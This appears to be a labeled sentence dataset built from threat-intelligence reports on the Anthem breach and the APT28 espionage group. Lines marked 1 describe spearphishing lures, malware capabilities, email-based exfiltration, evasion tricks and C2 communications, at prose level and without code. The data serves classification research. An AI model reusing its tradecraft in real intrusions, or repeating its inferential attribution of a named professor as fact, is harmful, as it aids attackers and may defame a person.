[ 39 ] [ 40 ] http://www.threatconnect.com / news / the - anthem- ...	0
We examined the links for any relevant intelligence , and discovered that nearly all of the search results led to pages that contained an announcement for an information security competition sponsored by the Southeast University - Topsec Information Security and Mobile Internet Technology Joint Research Center .	0
This entity appears to be a joint research venture between the University and Chinese networking giant Beijing Topsec Network Security Technology Co. , a.k.a .	0
Beijing Topsec .	0
[ 41 ] [ 42 ] The announcements list a Professor " Song Yubo " as the point of contact for the event , and directs interested parties to his email address , topsec2014@163[.]com , for further questions .	0
[ 43 ] [ 44 ] According to his LinkedIn page , Song is a Teacher at the Southeast University , speci�cally interested in the �eld of telecommunications .	0
Additionally , he is an avid researcher , and has published numerous academic papers on computer network exploitation on various e - journal publication sites , such as Google Scholar[45 ] .	0
Further , he lists skills such as " cryptography , " " penetration testing " and " computer network security , " etc .	0
on his Research Gate pro�le[46 ] .	0
[ 47 ] [ 48 ] As we continued to develop a pro�le on Professor Song , we began to have the sense that his interest in information security research strongly overlapped with that of someone who might be interested in or at least capable of conducting sophisticated cyber attacks .	0
However , interests alone are not enough to warrant reasonable suspicion , so we had to do more digging .	0
Additionally , the soft link between TopSec_2014@163[.]com and topsec2014@163[.]com alone was not suf�cient to make associations with any reasonable con�dence , but as it turns out , Yubo has in fact been previously named as a person of interest in the context of offensive Chinese cyber activity .	0
In March 2012 , Northrop Grumman presented a commissioned report to Congress[49 ] detailing Chinese cyber warfare capabilities .	0
The report asserts with high con�dence that both Song and the Information Security Research Center at Southeast University have received numerous state - sponsored research grants , and by extension , cooperated with the Government of China in conducting information security research and development ( R&D ) .	0
As stated on Southeast University 's own website , the main purpose of these grants are to develop technical acumen amongst its students via providing support for " state - owned scienti�c research institutions , state key enterprises , government agencies and People 's Liberation Army ( PLA ) units . " [ 50 ] [ 51 ] Southeast University is one of only three Chinese academic institutes that receives funding from all �ve of the State grant programs .	0
Song himself has also conducted his fair share of state- sponsored research , notably under the National Ministry of State Security 115 Program – a highly sensitive research grant to fund ambiguous information warfare R&D , almost certainly in support of PLA programs .	0
As we can see , the evidence continued to stack up .	0
The real smoking gun , however , was when we began to notice a strong temporal overlap with the various stages of the TOPSEC Cup that Song and Beijing Topsec were organizing , and the registration dates of malicious infrastructure as well as the malware compilation dates .	0
[ 52 ] [ 53 ] Based upon the translated registration form that we obtained from Song Yubo 's personal Baidu document sharing account , open registration for the " TOPSEC Cup " began on May 4th , 2014 and would close on May 14th , 2014 .	0
The details of the competition that were shared on the announcement are extremely ambiguous , and probably for good reason .	0
The introductory paragraph mentions that the primary goal of the event is to facilitate the training and discovery of new talent , noting that exceptional participants would receive priority consideration for internships and jobs with Beijing Topsec .	0
The event itself was broken down into several distinct rounds of competition .	0
Firstly , the preliminary round required that all eligible registrants would attempt to remotely access and navigate through the network .	0
Should a participating team perform exceptionally in the preliminary qualifying round , they would be invited to participate in the �nal round on - site in Nanjing .	0
In this �nal round , participants would be required to build their own " information systems and network environments . " The announcement notes that the students must rely upon their own laptop and software tools to accomplish this task .	0
Further , the announcement notes that participants are prohibited from attacking the provided server as well as their competitors .	0
Section Summary : Song Yubo and his research center at Southeast University appear to be central players in this narrative , as highlighted by their �nancial connections to the government of China , in particular the Ministry of State Security ( MSS ) , China 's premier human intelligence agency .	0
If the MSS was involved , we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow - on HUMINT targeting via blackmail , asset recruitment or technical targeting operations against individuals at home .	0
Song 's use of the topsec email alias suggests a greater association w/ TOPSEC .	0
It seems as if the competition is almost certainly the cause for the topsec2014[.]com domain .	0
What is very curious , however , is the initial registration by the reseller li2384826402@yahoo[.]com , which is a tactic seen within the con�rmed malicious faux VAE Inc.infrastructure .	0
The overlap between the competition website and the static command and control infrastructure seen in the Derusbi / Sakula implant is was likely an error made by the attackers .	0
The Company To enhance our open - source capabilities , we partnered up with Dr.	0
James Mulvenon[54 ] and his team of China experts at Defense Group , Inc.	0
( DGI)[55 ] .	0
We shared with them everything that we knew at the time , walking through the technical details which led us all the way to Song Yubo and the competition announcement .	0
From there , they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co ( Beijing Topsec ) , the sponsoring organization for Song Yubo 's information security competition .	0
DGI 's research indicated that Beijing Topsec is one of the largest information security hardware providers in China .	0
In 1996 , they were the �rst Chinese company to break into the market with the release of China 's �rst indigenously - manufactured �rewall .	0
Since then , they have expanded their business to include a consulting practice focused on issues such as vulnerability mining , software code analysis , threat intelligence , and encryption R&D , amongst other things .	0
The company served as a core technical support unit for network security at the 2008 Olympic Games – an event which was tightly controlled by the state .	0
Additionally , Beijing Topsec is a known partner of the Chinese military .	0
Since 2009 , the company has possessed information publication credentials for military network procurement .	0
Since 2013 , they have been publicly recognized as the Chinese equivalent of a cleared defense contractor .	0
The links between Beijing Topsec and the Chinese government are fairly substantial , highlighted by long - standing partnerships between even the most shadowy elements of the Chinese military .	0
The Leaked Cable A very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State , published by The Guardian.[56 ] The cable is a daily digest of Diplomatic Security alerts – essentially a situational awareness primer for State Department employees to inform them of new and existing threats .	0
In one section , the cable highlights that the Founder of Beijing Topsec , He Weidong , had openly talked about receiving directives from the PLA in an interview with China News Network .	0
In the interview , the founder quite curiously states that Topsec is less a commercial entity , but rather a research institute , and that the company received about half of its start - up capital directly from the PLA .	0
The cable further claims that Topsec actively recruits for the PLA cyber army .	0
[ 57 ] [ 58 ] It would also appear that not only does Beijing Topsec have deep ties to state - run cyber activity , but also within the independent hacker community as well .	0
Of note , the company hired the notorious hacker Lin Yong , a.k.a .	0
" Lion " ( of the Honker Union of China[59 ] ) in the early 2000s as a security service engineer and to conduct network training .	0
Section Summary : It is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state - sponsored activity .	0
The association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between state - sponsored activity and academic institutions , particularly those that receive funding from the central government .	0
All in all , it would seem that China is pursuing a uni�ed approach to cyber operations , relying on all unique facets of the workforce : academia , private industry , and independent hackers , as well as the PLA to achieve their strategic goals .	0
The Anthem breach exposes the insidious reality of modern Chinese cyber espionage as it continues its unrelenting strikes at the soft underbelly of the American way of life .	0
Moreover , it demonstrates the imposing yet increasingly common reality of conducting threat intelligence analysis without substantial threat intelligence to start with .	0
Fortunately for us , we were able to deduce informed answers to some of the outstanding questions to this breach by scrutinizing our archival data troves that are ef�ciently stored within our Threat Intelligence Platform and partner integrations .	0
In the �eld of cyber security , industry professionals must learn to play the long game in order to generate a proactive sense of situational awareness , allowing for greater ef�ciency and �exibility in mitigating future threats .	0
Additionally , this incident underscores the frustrating disparity of the industry when it comes to naming conventions .	0
With so many threat actors and indicators �oating around , it is can be frustrating to keep track of all the disparate pieces of evidence , especially when countless naming conventions are applied .	0
Without the use of a Threat Intelligence Platform to keep track of the �ood of incoming threat data , this task would be extraordinarily time consuming at best and crippling at worst .	0
Moving forward , it is important to bear in mind that the adversary , regardless of country of origin , shall almost certainly leverage our every weakness against us .	0
Even something as seemingly innocuous as confusion over names can easily consume analytical bandwidth , creating a window of opportunity to strike .	0
We – that is security professionals , private industry and governments alike – must proactively harden our network defenses and hasten our incident responses as a united , synchronous entity .	0
We have shared details on Song Yubo[60 ] and af�liated indicators within the ThreatConnect Common Community .	0
This share also includes the full - text DGI " BLUE HERON " research[61 ] which provides greater insight into Song Yubo , Southeast University and Beijing Topsec .	0
All things considered , industry must learn to adopt a cooperative defense mindset in the hopes of rebuf�ng future attacks .	0
The most resolute defense we have is each other , so be like the TCIRT and start actively defending your own community from the next big breach .	0
Register for a free ThreatConnect account today[62 ] to get started sharing and analyzing your threat intelligence .	0
Our clients often ask us to assess the threat Russia poses in cyberspace .	0
Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations .	0
This perception is due in part to the Russian government 's alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008 , as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise , also in 2008 .	0
These rumored activities , combined with a dearth of hard evidence , have made Russia into something of a phantom in cyberspace .	0
In this paper we discuss a threat group whose malware is already fairly well-known in the cybersecurity community .	0
This group , unlike the China-based threat actors we track , does not appear to conduct widespread intellectual property theft for economic gain .	0
Nor have we observed the group steal and profit from financial account information .	0
The activity that we profile in this paper appears to be the work of a skilled team of developers and operators collecting intelligence on defense and geopolitical issues – intelligence that would only be useful to a government .	0
We believe that this is an advanced persistent threat ( APT ) group engaged in espionage against political and military targets including the country of Georgia , Eastern European governments and militaries , and European security organizations since at least 2007 .	0
They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia 's major cities , including Moscow and St. Petersburg .	0
While we do n't have pictures of a building , personas to reveal , or a government agency to name , what we do have is evidence of long- standing , focused operations that indicate a government sponsor – specifically , a government based in Moscow .	0
We are tracking this group as APT28 .	0
APT28 targets insider information related to governments , militaries , and security organizations that would likely benefit the Russian government .	0
Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years .	0
Since 2007 , APT28 has systematically evolved its malware , using flexible and lasting platforms indicative of plans for long-term use .	0
The coding practices evident in the group's malware suggest both a high level of skill and an interest in complicating reverse engineering efforts .	0
• Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years .	0
• APT28 malware , in particular the family of modular backdoors that we call CHOPSTICK , indicates a formal code development environment .	0
Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time .	0
• APT28 tailors implants for specific victim environments .	0
They steal data by configuring their implants to send data out of the network using a victim network 's mail server .	1
• Several of APT28 's malware samples contain counter- analysis capabilities including runtime checks to identify an analysis environment , obfuscated strings unpacked at runtime , and the inclusion of unused machine instructions to slow analysis .	1
Indicators in APT28 's malware suggest that the group consists of Russian speakers operating during business hours in Russia 's major cities .	0
More than half of the malware samples with Portable Executable ( PE ) resources that we have attributed to APT28 included Russian language settings ( as opposed to neutral or English settings ) , suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years ( 2007 to 2013 ) .	0
Over 96 % of the malware samples we have attributed to APT28 were compiled between Monday and Friday .	0
More than 89 % were compiled between 8AM and 6PM in the UTC+4 time zone , which parallels the working hours in Moscow and St. Petersburg .	0
These samples had compile dates ranging from mid-2007 to September 2014 .	0
Three themes in APT28 's targeting clearly reflect areas of specific interest to an Eastern European government , most likely the Russian government .	0
Many of APT28 's targets align generally with interests that are typical of any government .	0
However , three themes in APT28 's targeting clearly reflects areas of specific interest to an Eastern European government , most likely the Russian government .	0
These include the Caucasus ( especially the Georgian government ) , Eastern European governments and militaries , and specific security organizations .	0
APT28 uses spearphishing emails to target its victims , a common tactic in which the threat group crafts its emails to mention specific topics ( lures ) relevant to recipients .	1
This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message , opening any attached files , or clicking on a link in the body of the email .	0
Since spearphishing lures are tailored to the recipients whose accounts APT28 hopes to breach , the subjects of the lures provide clues as to APT28's targets and interests .	0
For example , if the group's lures repeatedly refer to the Caucasus , then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus .	0
Similarly , APT28 's practice of registering domains that mimic those of legitimate news , politics , or other websites indicates topics that are relevant to APT28 's targets .	0
We identified three themes in APT28 's lures and registered domains , which together are particularly relevant to the Russian government .	0
In addition to these themes , we have seen APT28 target a range of political and military organizations .	0
We assess that the work of these organizations serves nation state governments .	0
The Caucasus , a region that includes Chechnya and other Russian republics and the independent states of Georgia , Armenia , and Azerbaijan , continues to experience political unrest .	0
The Georgian government 's posture and ties to the West are a frequent source of Moscow 's frustration , particularly after the 2008 war .	0
Overall , issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts .	0
Since 2011 , APT28 has used lures written in Georgian that are probably intended to target Georgian government agencies or citizens .	1
APT28 is likely seeking information on Georgia's security and diplomatic postures .	0
Specifically , the group has targeted the Georgian Ministry of Internal Affairs ( MIA ) and the Ministry of Defense ( MOD ) .	0
We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site .	0
APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs .	0
The MIA harbors sensitive information about the inner workings of Georgia 's security operations , the country 's engagement in multilateral institutions , and the government 's communications backbone .	0
It is responsible for : APT28 made at least two specific attempts to target the MIA .	0
In one case , we identified an APT28 lure from mid-2013 that referenced MIA-related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic .	1
The lure consisted of a weaponized Excel file that presented a decoy document containing a list of Georgian driver 's license numbers .	1
The backdoor attempted to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with '' @ mia.ge.gov '' .	1
Once connected to the mail server , APT28 's backdoor sent an email message using a subject line related to driver's licenses ( in Georgian ) , and attached a file containing system reconnaissance information .	1
This tactic could allow APT28 to obtain data from the MIA 's network through a less-monitored route , limiting the MIA network security department 's abilities to detect the traffic .	1
In the second example of MIA targeting , an APT28 lure used an information technology-themed decoy document that included references to the Windows domain '' MIA Users\Ortachala… '' ( Figure 1 ) .	1
This probably referred to the MIA facility in the Ortachala district of Tbilisi , Georgia 's capital city .	0
The decoy document also contains metadata listing '' MIA '' as the company name and '' Beka Nozadze '' as an author , a possible reference to a system administrator in Tbilisi .	1
The text of the document purports to provide domain and user group setup information for internal Windows XP and Windows 7 systems .	1
APT28 possibly crafted this document to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware .	1
APT28 also appeared to target Georgia 's MOD along with a U.S. defense contractor that was training the Georgian military .	0
APT28 used a lure document that installed a SOURFACE downloader ( further discussed in the Malware section ) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor .	1
The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces , assess Georgia's military capabilities , and develop a military training program for the country .	0
We believe that APT28 's targeting of the MOD aligns with Russian threat perceptions .	0
The growing U.S.-Georgian military relationship has been a source of angst for Russia .	0
Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008 , and Georgia has since sought to align itself more closely with western security organizations .	0
Additionally , in June 2014 , despite Russia 's vocal objections , Georgia , along with Ukraine and Moldova , signed association accords with the EU .	0
This move placed all three countries more firmly in the EU 's political , economic , and security spheres of influence .	0
Georgian military security issues , particularly with regard to U.S. cooperation and NATO , provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics .	0
Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion , identify dissidents , spread disinformation , or facilitate further targeting .	0
Another one of APT28 's lures appeared to target a specific journalist covering issues in the Caucasus region .	1
In late 2013 , APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a '' Chief Coordinator '' in Reason Magazine's '' Caucasian Issues Department '' - a division that does not appear to exist .	1
( Reason Magazine is a US-based magazine ) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine .	0
In the background , the decoy document installed a SOURFACE backdoor on the victim 's system .	1
The body of the letter suggests that APT28 actors are able to read at least two languages – Russian and English .	0
The grammar of the letter also indicates that English is not the author 's first language , despite it purportedly originating from a US-based magazine .	0
This implies that Russian may be the APT28 author 's preferred language .	0
Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion , identify dissidents , spread disinformation , or facilitate further targeting .	0
Several other nation states are suspected of targeting journalists and dissidents to monitor their activity , including China and Iran. , Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow .	0
Journalists critical of the Kremlin have long been targets of surveillance and harassment , and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media .	0
We have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus , as shown in the table below .	1
One APT28 domain imitated a key Chechen-focused news website , while the other appeared to target members of the Armenian military by hosting a fake login page .	1
Of particular note , the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists .	0
In 2004 and 2013 , Russia 's Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website .	0
Eastern European countries ' political and military postures are traditionally core Russian government interests .	0
The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic , political , and military interest .	0
Over the past two decades , as many of these states joined NATO and the EU , Russia has attempted to regain its influence in the region .	0
Many of APT28 's targets parallel this continued focus on Eastern European governments and militaries .	0
We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations : • In a late 2013 incident , a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client 's network .	0
• More recently , in August 2014 APT28 used a lure ( Figure 3 ) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government .	1
A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post .	1
The Polish security company indicated that the sample was '' sent to the government , '' presumably the Polish government , given the company 's location and visibility .	0
We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations .	0
APT28 has registered domains similar to those of legitimate Eastern European news sites and governments , listed in Table 2 .	1
These domain registrations not only suggest that APT28 is interested in Eastern European political affairs , but also that the group targets Eastern European governments directly .	0
In addition , APT28 used one domain for command and control sessions ( baltichost [ . ] org ) that was themed after the Baltic Host exercises .	1
Baltic Host is a multinational logistics planning exercise , hosted annually since 2009 by one of the three Baltic States ( Estonia , Latvia , and Lithuania , all three of which are on Russia 's border ) on a rotational basis .	0
In June 2014 , this event was integrated with a larger U.S. Army training event , and focused on exercises to improve interoperability with regional allies and partners. , This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters .	0
Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships .	0
These exercises are a particular point of interest in Moscow : pro- Kremlin press cited Russia 's interpretation of these military exercises and NATO 's involvement as a '' sign of aggression , '' and Russia 's Foreign Minister publicly stated that the exercise was '' a demonstration of hostile intention .	0
'' APT28 's lures and domain registrations also demonstrate their interest in NATO and other European security organizations .	0
NATO remains a chief Russian adversary , or in the words of Russia 's 2010 military doctrine , a '' main external military danger '' particularly as it moves '' closer to the borders of the Russian Federation .	0
'' As the traditional western counterweight to the Soviet Union , Russia regards NATO , particularly NATO 's eastward expansion , as a threat to Russia 's strategic stability .	0
APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe ( OSCE ) , an intergovernmental organization that has cited widespread fraud in numerous Russian state elections .	0
Insider information about NATO , the OSCE and other security organizations would inform Russian political and military policy .	0
Several of the domains APT28 registered imitated NATO domain names , including those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition .	1
We also observed a user that we suspect works for NATO HQ submit an APT28 sample to VirusTotal , probably as a result of receiving a suspicious email .	0
APT28 also demonstrated an interest in defense attaches working in European countries .	0
We identified an APT28 lure containing a decoy document with a list of British officers and U.S. and Canadian military attachés in London .	1
Finally , APT28 used a lure that contained an apparent non-public listing of contact information for defense attachés in the '' Ankara Military Attaché Corps ( AMAC ) , '' which appears to be a professional organization of defense attachés in Turkey .	1
In addition to targeting European security organizations and governments , it appears that APT28 is targeting attendees of European defense exhibitions .	0
Some of the APT28- registered domains imitated those of defense events held in Europe , such as the Farnborough Airshow 2014 , EuroNaval 2014 , EUROSATORY 2014 , and the Counter Terror Expo .	1
In September 2014 , APT28 registered a domain ( smigroup- online.co [ . ] uk ) that appeared to mimic that for the SMi Group , a company that plans events for the '' Defence , Security , Energy , Utilities , Finance and Pharmaceutical sectors .	1
'' Among other events , the SMi Group is currently planning a military satellite communications event for November 2014 .	0
Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies , as well as the victim organizations' operations , communications , and future plans .	0
APT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above .	0
However , we are not profiling all of APT28 's targets with the same detail because they are not particularly indicative of a specific sponsor 's interests .	0
They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests .	0
Other probable APT28 targets that we have identified : Our analysis of some of the group 's more commonly used tools indicates that APT28 has been systematically updating their malware since 2007 .	0
APT28 's tools are suggestive of the group 's skills , ambitions , and identity .	0
Our analysis of some of the group 's more commonly used tools indicates that APT28 has been systematically updating their tools since 2007 .	0
APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility , who make an effort to obfuscate their activity .	0
This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization , most likely a nation state government .	0
APT28 's malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours , which suggests that the Russian government is APT28 's sponsor .	0
Some of APT28 's more commonly used tools are the SOURFACE downloader , its second stage backdoor EVILTOSS , and a modular family of implants that we call CHOPSTICK .	1
• SOURFACE : This downloader is typically called Sofacy within the cyber security community .	0
However because we have observed the name '' Sofacy '' used to refer to APT28 malware generally ( to include the SOURFACE dropper , EVILTOSS , CHOPSTICK , and the credential harvester OLDBAIT ) , we are using the name SOURFACE to precisely refer to a specific downloader .	1
This downloader obtains a second-stage backdoor from a C2 server .	1
CORESHELL is an updated version of SOURFACE .	0
• EVILTOSS : This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance , monitoring , credential theft , and shellcode execution .	1
• CHOPSTICK : This is a modular implant compiled from a software framework that provides tailored functionality and flexibility .	0
A number of the malware variants that we profile below , especially the CHOPSTICK family , demonstrate formal coding practices indicative of methodical , diligent programmers .	0
The modularity of CHOPSTICK alone , with its flexible and lasting platform , demonstrates planning for long-term use and versatility .	0
We have also noted that APT28 tailors implants to their target environments , configuring them to use local network resources such as email servers .	1
APT28 has attempted to obfuscate their code and implement counter-analysis techniques : • One of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions .	1
This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly .	1
• A number of CORESHELL droppers also conduct runtime checks , attempting to determine if they are executing in an analysis environment , and if so , they do not trigger their payloads .	1
• Many samples across the SOURFACE/ CORESHELL , CHOPSTICK , and EVILTOSS malware families obfuscate strings that are decoded at runtime .	1
Two of the malware families ( SOURFACE/CORESHELL and EVILTOSS ) use the same decryption sequence and similar algorithms for string encoding and decoding .	1
These families encode their strings at compile time using a custom stream cipher .	1
From a high level , these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations .	0
• APT28 has employed RSA encryption to protect files and stolen information moved from the victim 's network to the controller .	1
APT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007 .	0
These changes indicate a long-standing and dedicated development effort behind APT28 .	0
We have observed samples of the SOURFACE downloader compiled between 2007 and 2014 .	0
We call SOURFACE ( samples are frequently named netids.dll ) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server .	1
Until 2013 , the SOURFACE downloader used hard-coded IP addresses for C2 communications , whereas the future CORESHELL samples use domains .	1
First , a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others .	0
There are exceptions : for example , some files contain public and standard code libraries that we do not take into consideration when making a family determination .	0
A malware ecosystem is a group of malware families that work together to perform the same objective .	0
Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together .	0
They may not share the same code structure , but they are related because one drops and installs the other .	1
The ecosystem surrounding the SOURFACE downloader frequently consists of a dropper , which installs SOURFACE .	1
The SOURFACE downloader then receives another dropper from its C2 server , and this second dropper installs a second stage backdoor , which is usually EVILTOSS .	1
In April 2013 , based on compile time , the group began to make significant alterations to the SOURFACE downloader .	0
They started by changing the compiled DLL name to '' coreshell.dll '' and making minor changes to the network communications , as seen in Figure 7 .	0
The hostname , volume serial number and OS version data are encoded in the new URL format .	0
As seen in the table below , the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time .	0
In April 2013 , based on compile time , the group began to make significant alterations to the SOURFACE downloader .	0
Variants of the SOURFACE second stage backdoor , EVILTOSS , share some code similarities with SOURFACE .	0
However , it contains more capabilities , including the ability to provide access to the file system and registry , enumerate network resources , create processes , log keystrokes , access stored credentials , and execute shellcode .	1
The backdoor encrypts data that it uploads with an RSA public key .	1
Many of its variants we have seen are named netui.dll .	0
EVILTOSS variants may use the Simple Mail Transfer Protocol ( SMTP ) to send stolen data in an attachment named '' detaluri . dat '' .	1
The backdoor attaches this file to a preformatted email and sends it out through a victim 's mail server .	1
Interestingly , we found an antivirus report from 2004 detailing what appears to be an early variant of EVILTOSS .	0
The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8 .	1
The backdoor sent data via SMTP to natosmtp @ mail [ . ] ru and received its tasking via POP from natopop @ mail [ . ] ru .	1
Although we have not conclusively attributed this sample to APT28 , it does suggest the possibility that APT28 has been operating since as early as 2004 .	0
A modular development framework suggests the group has had an organized development effort since as early as 2007 .	0
During our research , we discovered that APT28 uses a backdoor developed using a modular framework .	1
We call this backdoor CHOPSTICK , a somewhat ironic name that comes from our semi-random name generator .	0
The modular design allows flexible options for compiling variants with different capabilities as needed , as well as deploying additional capabilities at runtime .	0
This allows the developers to make targeted implants , including only the capabilities and protocols necessary for a specific environment .	0
Such a modular framework suggests the group has had an organized development effort since as early as 2007 .	0
A formal development environment , in which code is versioned and well-organized , would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time .	0
CHOPSTICK variants may move messages and information using at least three methods : 1 .	0
Communications with a C2 server using HTTP .	1
These protocols are covered in more detail in Appendix D. 2 .	0
Email sent through a specified mail server .	1
One CHOPSTICK v1 variant contained modules and functions for collecting keystroke logs , Microsoft Office documents , and PGP files .	1
The monitoring for new files of interest is performed by a '' Directory Observer '' module .	1
In one sample this information was intended to be sent via SMTP using a Georgian MIA mail server .	1
It used one of four embedded sender email addresses ( @ mia.gov.ge ) to send files via email to another email address on the same mail server .	1
All information required for the email was hardcoded in the backdoor .	0
3 .	0
Local copying to defeat closed networks .	0
One variant of CHOPSTICK focuses on apparent air gap / closed network capabilities by routing messages between local directories , the registry and USB drives .	1
During our research into APT28 's malware , we noted two details consistent across malware samples .	0
The first was that APT28 had consistently compiled Russian language settings into their malware .	0
The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone , which includes major Russian cities such as Moscow and St. Petersburg .	0
PE resources include language information that can be helpful if a developer wants to show user interface items in a specific language .	0
Non-default language settings packaged with PE resources are dependent on the developer 's build environment .	0
Each PE resource includes a '' locale '' identifier with a language ID '' composed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region .	0
'' At the time of the writing of this paper , we had identified 103 malware samples that were both attributed to APT28 and contained PE resources .	0
Table 5 shows the locale identifiers with associated language and country/region for these samples .	0
The samples with Russian language settings were compiled between late 2007 and late 2013 , as depicted in Figure 9 .	0
This consistency over a long timeframe suggests that the developers of APT28 malware were using a build environment with Russian language settings at least some of the time and made no effort to obscure this detail .	0
Overall , the locale IDs suggest that APT28 developers can operate in both Russian and English .	0
Of the 140 malware samples that we have attributed to APT28 so far , over 89 % were compiled between 0400 and 1400 UTC time , as depicted in Figure 10 .	0
Over 96 % were compiled between Monday and Friday .	0
This parallels the working hours in UTC+0400 ( that is , compile times begin about 8AM and end about 6PM in this time zone ) .	0
This time zone includes major Russian cities such as Moscow and St. Petersburg .	0
We started researching APT28 based on activity we observed on our clients ' networks , similar to other targeted threat groups we have identified over time .	0
We assess that APT28 is most likely sponsored by the Russian government .	0
We summarize our key observations about APT28 in Figure 11 below .	0
APT28 's characteristics-their targeting , malware , language , and working hours-have led us to conclude that we are tracking a focused , long- standing espionage effort .	0
Given the available data , we assess that APT28 's work is sponsored by the Russian government .	0
We use the term '' threat group '' to refer to actors who work together to target and penetrate networks of interest .	0
These individuals may share the same set of tasks , coordinate targets , and share tools and methodology .	0
They work together to gain access to their targets and steal data .	1
The art of attributing disparate intrusion activities to the same threat group is not always simple .	0
Different groups may use similar intrusion methodologies and common tools , particularly those that are widely available on the Internet , such as pwdump , HTran , or Gh0st RAT .	0
There may be overlaps between groups caused by the sharing of malware or exploits they have authored , or even the sharing of personnel .	0
Individual threat actors may move between groups either temporarily or permanently .	0
A threat actor may also be a private citizen who is hired by multiple groups .	0
Multiple groups , on occasion , compromise the same target within the same timeframe .	0
Distinguishing one threat group from another is possible with enough information , analytical experience , and tools to piece it all together .	0
We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another .	0
Threat actors leave behind various forensic details .	0
They may send spear phishing emails from a specific IP address or email address .	1
Their emails may contain certain patterns ; files have specific names , MD5 hashes , timestamps , custom functions , and encryption algorithms .	0
Their backdoors may have command and control IP addresses or domain names embedded .	0
These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another .	0
At the most basic level , we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved .	0
We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them .	0
In this way , we can always go back and answer '' why '' we associated cyber threat activity with a particular group .	0
SOURFACE is a downloader that obtains a second stage backdoor from a C2 server .	1
Over time the downloader has evolved and the newer versions , usually compiled with the DLL name 'coreshell.dll ' , are distinct enough from the older versions that we refer to it as SOURFACE/CORESHELL or simply CORESHELL .	0
This appendix focuses on these newer versions .	0
CORESHELL uses two threads to communicate with its C2 server .	1
The first thread sends beacons that contain the process listing of the compromised host .	1
The second thread is responsible for downloading and executing stage two payloads .	1
Messages are sent using HTTP POST requests whose bodies contain encrypted and Base64 encoded data .	1
The encryption algorithm is a custom stream cipher using a six-byte key .	0
Commands from the controller to the CORESHELL implant are encrypted using another stream cipher but this time using an eight-byte key .	1
CORESHELL has used the same user agent string ( '' MSIE 8.0 '' ) that SOURFACE previously used , but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system .	0
Figure 11 shows an example POST request .	0
When Base64 decoded , the POST content looks like this : The key used to encrypt the message is six bytes long and is appended to the end of the message .	0
In this is example the key would be : 30 ac e5 21 e4 a6 .	0
When the message is decrypted , the resulting plaintext is : The following table contains a breakdown of each of the field 's C2 message .	0
Commands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST requests .	1
